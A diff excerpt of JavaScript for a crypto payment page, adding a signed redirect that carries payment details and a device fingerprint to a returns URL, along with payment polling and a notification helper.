+// 🚀 SECURE REDIRECT HANDLER (INTEGRATED)
+// ================================
+async function handleSecureRedirect(txHash) {
+
+    try {
+
+        if (
+            typeof expectedAmount === "undefined" ||
+            typeof activeWallet === "undefined"
+        ) {
+            throw new Error("Missing required payment variables");
+        }
+
+        const rawPayload = {
+            plan: "custom",
+            status: "success",
+            amount: expectedAmount,
+            time: Date.now(),
+
+            wallet: activeWallet,
+            txHash: txHash || null,
+
+            deviceId: deviceId,
+            nonce: nonce,
+            fingerprint: getFingerprint()
+        };
+
+        const payloadString = JSON.stringify(rawPayload);
+        const signature = await sign(payloadString);
+
+        const finalPayloadObj = {
+            ...rawPayload,
+            signature
+        };
+
+        const payload = encodeURIComponent(
+            btoa(JSON.stringify(finalPayloadObj))
+        );
+
+        setTimeout(() => {
+            window.location.href =
+                `https://link.avalonflow.site/returns?payload=${payload}`;
+        }, 1200);
+
+    } catch (err) {
+        console.error("Secure redirect error:", err);
+    }
+}
+
+// ---------------- POLLING ----------------
+let pollInterval = 30000; // start at 30s
+let pollTimeout;
+
+function poll() {
+    pollTimeout = setTimeout(async () => {
+        const done = await checkPayment();
+        if (!done && Date.now() - startTime <= totalDuration) {
+            pollInterval = Math.min(pollInterval + 30000, 120000);
+            poll();
+        }
+    }, pollInterval);
+}
+
+// ---------------- MANUAL ENGINE GUARD ----------------
+function startManualIfAllowed() {
+    if (paymentMode !== "manual") return;
+
+    poll();
+    checkPayment();
+}
+
+
+function triggerNotification(message, duration = 3000) {
+    const notification = document.getElementById("planNotification");
+    if (!notification) return;
+
+    notification.textContent = message;
+    notification.classList.add("show");
+
+    setTimeout(() => notification.classList.remove("show"), duration);
+}
+</script>
+</body>
+</html>
+
+ 
